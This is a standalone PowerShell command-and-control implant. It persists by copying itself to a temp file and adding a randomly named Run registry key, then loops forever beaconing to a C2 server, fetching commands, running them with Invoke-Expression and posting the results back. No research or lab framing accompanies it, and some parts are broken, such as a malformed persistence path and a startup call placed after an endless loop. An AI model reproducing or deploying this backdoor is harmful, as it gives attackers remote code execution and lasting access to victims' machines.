$C2Server = "http://192.168.0.1:5000"
$CommandPollInterval = 5

# Persistence - Copy itself to a hidden path and add registry key for persistence
$PSTempPath = [System.IO.Path]::GetTempFileName() + ".ps1"
Copy-Item $MyInvocation.MyCommand.Path $PSTempPath -Force

Add-Type -AssemblyName System.Windows.Forms
$RegistryKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$RegValueName = [System.IO.Path]::GetRandomFileName()
New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT
Set-ItemProperty -Path $RegistryKey -Name $RegValueName -Value (Join-Path $PSTempPath "C:\Windows\System32\cmd.exe")

# Beaconing Function
function SendHeartbeat() {
    Invoke-RestMethod -Uri "$C2Server/heartbeat"
}

# Command Polling and Execution
while ($true) {
    # Beaconing
    SendHeartbeat

    $Command = Invoke-WebRequest -Uri "$C2Server/command" -UseBasicParsing
    if ($null -ne $Command.Content) {
        try {
            $Result = Invoke-Expression $Command.Content
            Invoke-RestMethod -Uri "$C2Server/output" -Body @{"output"="$Result"} -Method Post
        } catch {
            $ErrorDetails = $_.Exception.Message
            Invoke-RestMethod -Uri "$C2Server/error" -Body @{"error"="$ErrorDetails"} -Method Post
        }
    }

    Start-Sleep -Seconds $CommandPollInterval
}

# Run the beaconing function on startup
SendHeartbeat
